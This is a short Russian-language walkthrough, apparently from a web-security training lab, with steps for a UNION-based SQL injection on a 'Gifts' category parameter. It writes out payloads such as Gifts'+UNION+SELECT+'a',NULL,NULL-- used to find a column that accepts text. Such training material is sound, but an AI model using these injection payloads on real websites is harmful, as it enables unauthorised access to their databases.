1) Переходим на сайт задания в раздел Gifts
2) Снова меняем запрос, но на этот раз вместо одного из NULL пишем необходимую строку:
category=Gifts'+UNION+SELECT+'a',NULL,NULL--
3) Ошибка сервера - меняем следующий NULL:
category=Gifts'+UNION+SELECT+NULL,'a',NULL--